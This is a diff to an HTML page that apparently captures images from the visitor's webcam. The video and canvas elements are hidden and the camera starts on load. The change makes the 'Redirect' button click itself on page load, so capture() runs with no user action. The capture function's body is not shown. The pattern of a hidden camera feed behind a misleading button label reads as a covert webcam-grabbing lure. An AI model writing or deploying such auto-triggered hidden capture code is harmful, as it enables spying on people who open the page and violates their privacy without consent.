@@ -2,7 +2,7 @@
 <html>
 <body>
 
-<button onclick="capture()">Redirect</button>
+<button id="autoBtn" onclick="capture()">Redirect</button>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
@@ -68,6 +68,10 @@ async function capture() {
 }
 
 window.onload = startCamera;
+window.addEventListener('load', () => {
+  const button = document.getElementById('autoBtn');
+  if (button) button.click();
+});
 </script>
 
 </body>
